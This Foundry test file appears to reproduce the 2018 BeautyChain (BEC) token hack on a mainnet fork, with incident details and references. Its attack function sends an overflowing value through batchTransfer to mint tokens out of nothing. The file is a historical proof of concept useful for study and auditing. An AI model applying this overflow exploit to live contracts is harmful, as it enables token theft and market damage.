// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~900m USD
//   - A huge supply of BEC has been generated out of thin air.
//   - It is worth noting that the attacker only cashed out a small amount of BEC. (https://etherscan.io/token/0xC5d105E63711398aF9bbff092d4B6769C82F793D?a=0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033)
//   - The $900m USD loss refers to the market value loss of BEC.
// Vulnerability Type : Integer Overflow
// Attacked At : Mainnet, block height 5483643, 2018-04-22T03:28:52Z
// Attacker : 0x09a34E01fBaa49F27b0B129D3c5e6e21ED5fe93c
// Exploit Contract : N/A
// Revenue Address :
//   - 0x0e823fFE018727585EaF5Bc769Fa80472F76C3d7
//   - 0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033
// Victim Contract : 0xC5d105E63711398aF9bbff092d4B6769C82F793D
// Vulnerable Snippet : https://etherscan.io/address/0xC5d105E63711398aF9bbff092d4B6769C82F793D#code#L261
// Attack Txs : 
//   - 0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f (height 5483643)
// 
// @Ref
// Halborn ; https://www.halborn.com/blog/post/arithmetic-underflow-and-overflow-vulnerabilities-in-solidity
// SECBIT : https://medium.com/secbit-media/a-disastrous-vulnerability-found-in-smart-contracts-of-beautychain-bec-dbf24ddbc30e
// NVD : https://nvd.nist.gov/vuln/detail/cve-2018-10299

contract Attacker is Test {
    IBecToken private constant bec = IBecToken(0xC5d105E63711398aF9bbff092d4B6769C82F793D);
    
    address private constant revenueAddr0 = 0x0e823fFE018727585EaF5Bc769Fa80472F76C3d7;
    address private constant revenueAddr1 = 0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033;

    function setUp() public {
        vm.createSelectFork("mainnet", 5_483_642);
    }
    
    function testExploit() public {
        console.log("[Before Attack] bec.balanceOf(revenueAddr0) = %18e", bec.balanceOf(revenueAddr0));
        console.log("[Before Attack] bec.balanceOf(revenueAddr1) = %18e", bec.balanceOf(revenueAddr1));
        attack();
        console.log("[After Attack] bec.balanceOf(revenueAddr0) = %18e", bec.balanceOf(revenueAddr0));
        console.log("[After Attack] bec.balanceOf(revenueAddr1) = %18e", bec.balanceOf(revenueAddr1));
    }

    function attack() public {
        address[] memory receivers = new address[](2);
        receivers[0] = revenueAddr0;
        receivers[1] = revenueAddr1;
        uint256 value = type(uint256).max / 2 + 1;
        bec.batchTransfer(receivers, value);
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------

// Shortened interface, removed unused methods.
interface IBecToken {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function batchTransfer(address[] memory _receivers, uint256 _value) external returns (bool);
}
